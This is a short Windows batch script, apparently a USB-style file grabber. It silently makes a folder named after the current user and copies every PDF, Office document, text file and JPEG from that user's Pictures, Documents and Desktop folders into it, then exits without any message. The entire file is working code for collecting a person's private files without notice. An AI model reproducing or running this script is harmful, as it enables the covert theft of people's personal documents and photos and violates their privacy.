@echo off

IF NOT EXIST ".\cosas\"%USERNAME% MD ".\cosas\"%USERNAME%

cd ".\cosas\"%USERNAME%

for /R %USERPROFILE%\Pictures\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"

for /R %USERPROFILE%\Documents\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERPROFILE%\Desktop\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"


EXIT

